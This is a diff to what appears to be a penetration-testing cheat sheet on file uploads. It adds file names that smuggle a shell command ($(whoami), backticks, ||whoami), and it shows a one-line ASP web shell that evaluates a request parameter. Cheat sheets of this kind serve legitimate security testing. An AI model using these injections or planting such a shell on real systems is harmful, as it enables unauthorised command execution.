@@ -63,6 +63,8 @@ XSS attacks can also be carried with `SVG` images, along with several other at
 ```
 ## Injections in File Name
 
+name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`
+
 **Simple .NET shell**
 ```asp
 <% eval request('cmd') %>
